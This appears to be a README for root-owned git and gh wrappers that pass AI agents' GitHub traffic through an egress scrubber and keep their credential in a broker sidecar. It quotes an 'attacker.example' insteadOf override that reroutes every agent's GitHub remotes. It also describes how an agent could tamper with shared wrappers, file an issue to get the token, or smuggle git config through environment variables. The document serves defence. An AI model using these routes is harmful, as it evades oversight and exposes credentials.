# GitHub egress wrappers

The five scripts in this directory shadow `gh`, `git` and `github-mcp-server`
so that agent-authored content passes through the egress scrubber (PEN-2527,
PEN-3152, PEN-3156) and so that every invocation re-reads the GitHub App token
from its mounted file rather than from stale `hosts.yml` state.

They are installed **into the image, root-owned**, at
`/usr/local/libexec/paperclip/bin/` — `Dockerfile` installs them and
`Dockerfile.agent` copies them from the server image, so the two cannot drift.

## Why they live in the image (PEN-3713)

They used to be written at runtime by the chart's `seed` initContainer into
`<mountPath>/.local/bin` on the fleet-shared PVC. That is a security defect, not
a packaging choice:

- the volume is one CephFS share across every agent in every company;
- `seed` runs `runAsUser: 1000`, which is the uid every agent also runs as, so
  the writer **is** the consumer — its `chown 1000:1000` is a no-op and `|| true`
  masks that;
- a file uid 1000 creates is a file uid 1000 can replace, so there is no mode
  and no `chown` that fixes it while the scripts live there.

`paperclip-github-token-env` is the token injector itself. One agent rewriting
one file on that volume would have it executed in every other agent's run,
holding the live GitHub App installation token.

Nothing in the PEN-2527 design depended on the PVC. Token freshness comes from
the wrapper re-reading the token file on every exec — a property of the script's
content, not of where the script is stored. The volume was only ever a
convenient shared channel between two images; `COPY --from=server` is a better
one, because it cannot be written at run time.

## The duplicate copies are gone (PEN-3840)

This directory is now the only generation. The `seed` initContainer no longer
writes wrapper copies onto the PVC, the seeded `.mcp.json` names
`/usr/local/libexec/paperclip/bin/github-mcp-server` rather than the PVC copy,
and `deploy/helm/paperclip/tests/agent-egress-path.test.mjs` asserts the chart
writes no GitHub wrapper onto the volume at all.

Retiring the PVC generation was deferred out of PEN-3713 and gated on a fleet
census: an agent pod on a pre-PEN-3713 image had no root-owned copy, so removing
the PVC install before every agent image carried this directory would have
dropped it straight through to the unscrubbed `/usr/bin/gh`. That census was
measured clean before the removal landed.

One piece of the old arrangement deliberately survives: `<mountPath>/.local/bin`
is still on PATH, **behind** this directory. It holds no wrapper any more. It
stays because the PVC shell dotfiles prepend it whenever PATH lacks it — so
removing the entry would not drop the directory, it would promote it ahead of
this one. See `paperclip.toolingBinDirs` in the chart helpers for the mechanism
and the measurement.

### `github-mcp-server` is the exception: it is still dialled on the PVC

PATH ordering is what makes the fallback above safe in both directions, and the
seeded `.mcp.json` does not get it — it names an **absolute** command, so
whatever it names is what runs. That choice cannot be made correctly where it is
currently written: the `seed` initContainer runs in the **server** pod, while
the `.mcp.json` it writes is consumed by **agent Job** pods running a different
image, pinned by `adapterConfig.image` — a database value that moves on an image
bump, not on a chart deploy. A test against the server's own filesystem reports
on the wrong machine.

So `.mcp.json` deliberately keeps naming the PVC copy, and
`github-mcp-server` is the one wrapper whose agent-writable copy is still on the
traffic path after this change. Pointing it at this directory as soon as the
*server* image carries it would break the github MCP server on every agent pod
still on an older image, fleet-wide, with no reachable fallback. The flip
belongs in the same follow-up that deletes the seed install: that is already
gated on the whole fleet carrying this directory, which is exactly the condition
that makes the absolute path safe.

## The publish broker (PEN-4933)

When `enableGitHubPublishBroker` is set on the agent adapter, the GitHub
credential Secret stops being mounted into the agent container and is mounted
into a `github-publish-broker` sidecar instead. *On the agent adapter* is the
whole of it: PEN-5017 pins the key to agent provenance, so a per-issue
`assigneeAdapterOverrides.adapterConfig` carrying it is discarded and logged,
never honoured — otherwise an agent could file an issue against itself and
render the credential back into its own container. These scripts are unchanged in
shape — they still lead PATH, still re-read the token file, still exec the same
egress runtimes — but in the agent container that token file no longer exists,
and each runtime hands the invocation to the broker over a unix socket.

Two consequences worth knowing before editing anything here:

- `paperclip-github-token-env` now execs its child WITHOUT a token when the
  broker socket is set and the token file is absent. That is the designed state
  in a brokered agent container, not a fault. Every other refusal is unchanged:
  a missing token file with no broker configured is still the loud failure
  PEN-3705 made it.
- The broker runs these same scripts, in its own container, with
  `PAPERCLIP_GITHUB_BROKER_ROLE=server` set — which is what makes the runtimes
  do the work locally instead of forwarding again. So there is still exactly one
  definition of each door, and the scan that decides what a push may contain is
  still the pre-push hook running `scrubGitHubEgressText`. A change here changes
  both sides at once, which is the point.

None of this is a security control in itself. The boundary is that the
credential is in a container the agent cannot read into; an agent that edits or
ignores these scripts reaches `/usr/bin/git` with nothing to authenticate with.
See `docs/security/PEN-3183-git-egress-enforcement-boundary-decision.md`.

## Editing one

Edit the file here, and make the matching edit to the heredoc in
`deploy/helm/paperclip/templates/statefulset.yaml` — the drift test will tell
you if you forget. The comparison is not byte-exact: it substitutes the
directory the two copies reference for each other
(`/usr/local/libexec/paperclip/bin` here, `/paperclip/.local/bin` there), and it
trims each line on both sides, so it is blind to leading and trailing
whitespace. The per-line trim is load-bearing rather than incidental — the seed
copy is a heredoc nested inside YAML and carries that indentation — but it does
mean a pure-indentation change will not be reported as drift.

## The git config overrides are pinned as an exact set (PEN-4541)

`git` passes two `-c` flags — one clearing any inherited
`credential.https://github.com.helper`, one pointing it at
`github-token-credential-helper` — and the other four wrappers pass none. That
is asserted as an **equality**, per wrapper, in
`deploy/helm/paperclip/tests/agent-egress-path.test.mjs`
(`EXPECTED_WRAPPER_CONFIG_FLAGS` in `scripts/git-config-surface.mjs`). Adding a
wrapper to this directory without declaring its flag set there fails that test
by design.

It is an equality and not an `includes()` because the mutation worth catching is
an **added** flag. Appending
`-c url.https://attacker.example/.insteadOf=https://github.com/` makes every
agent in the fleet silently reroute its GitHub remotes — and it adds **zero**
occurrences of `/usr/local/libexec/paperclip/bin`, so the older path-count guard
in the same file (PEN-3748) stays green on it. Those two assertions look alike
and catch different things; neither replaces the other.

`-c` is not the only spelling, and the equality covers all of them. git also
accepts `--config-env=<key>=<ENVVAR>` and `--config-env <key>=<ENVVAR>` (>=2.31),
which take the VALUE from an environment variable so the injected config never
appears on the exec line at all. Both forms are read and normalised to the
attached spelling, so they cannot be used to produce two different-looking but
equal flag sets. There is deliberately no sticky `-c<value>` case: git rejects
that outright, so accepting it would invent a shape the wrapper cannot have.

The same test also refuses any `insteadOf` (any casing) and any `GIT_CONFIG*`
variable anywhere in a wrapper body. `GIT_CONFIG_COUNT`/`KEY_n`/`VALUE_n` is the
argv-free equivalent of `-c`, and `GIT_CONFIG_PARAMETERS` is git's own internal
carrier for `-c` values; either would otherwise walk straight past a flag-set
check. That scan is a PREFIX match (`/\bGIT_CONFIG\w*/`) rather than a list of
the names known today — the list form shipped briefly and missed
`GIT_CONFIG_PARAMETERS`, which is the most direct carrier of the lot.

Those two spellings are what review caught at head `b70c7aae`: the first cut
read only `-c` and enumerated the env names, so a **credential-helper swap** —
not a URL rewrite, so the `insteadOf` scan was no backstop — passed both
assertions. Each shape now has a positive control that reds the check, and each
control was mutation-tested by reverting the fix.

A second, independent check asserts the same thing about the image as built,
rather than as declared here: `scripts/check-agent-image-git-config.mjs` runs in
`docker-agent.yml` before the agent image is promoted, and requires the shipped
`/usr/local/libexec/paperclip/bin/git` to be byte-identical to this file.

⛔ Both are build-time gates on the artifact at production. Neither covers
mutation of an already-published image or drift of a running pod; registry-side
immutability is a separate control that was deliberately not assigned with
PEN-4541.
